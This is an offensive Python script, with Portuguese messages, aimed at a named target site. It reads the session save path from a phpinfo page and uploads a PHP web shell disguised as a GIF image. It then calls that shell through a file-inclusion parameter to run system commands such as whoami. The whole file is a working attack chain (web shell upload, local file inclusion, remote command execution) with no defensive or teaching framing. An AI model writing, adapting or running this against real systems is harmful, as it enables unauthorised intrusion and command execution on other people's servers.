#!/usr/bin/env python3
import requests
import re
import sys

BASE = "http://www.alvo.com.br/phpinfo.php"
UPLOAD_FORM = "http://www.alvo.com.br/upload.php"  # ajustar se outro endpoint

def get_tmp_path():
    resp = requests.get(BASE)
    m = re.search(r"Session Save Path => (/tmp/php\S+)", resp.text)
    if m:
        return m.group(1)
    print("[-] tmp path não encontrado.")
    sys.exit()

def upload_shell(tmp_path):
    # payload GIF + PHP
    payload = b"GIF89a;\n<?php system($_GET['cmd']); ?>"
    files = {
        "file": ("shell.php.gif", payload, "image/gif")
    }
    resp = requests.post(UPLOAD_FORM, files=files)
    if resp.status_code != 200:
        print("[-] Falha no upload.")
        sys.exit()
    print("[+] Shell enviado.")
    return tmp_path + "/shell.php.gif"

def trigger_shell(shell_path, cmd="id"):
    lfi = f"{BASE}?file={shell_path}"
    resp = requests.get(lfi + f"&cmd={cmd}")
    if resp.status_code == 200:
        print("[+] Resultado do comando:")
        print(resp.text)
    else:
        print("[-] falha ao executar o shell.")

if __name__ == "__main__":
    print("[*] Coletando tmp path...")
    tmp = get_tmp_path()
    print(f"[+] tmp path: {tmp}")

    print("[*] Enviando shell disfarçado...")
    shell_busy = upload_shell(tmp)

    print("[*] Executando payload...")
    trigger_shell(shell_busy, cmd="whoami")
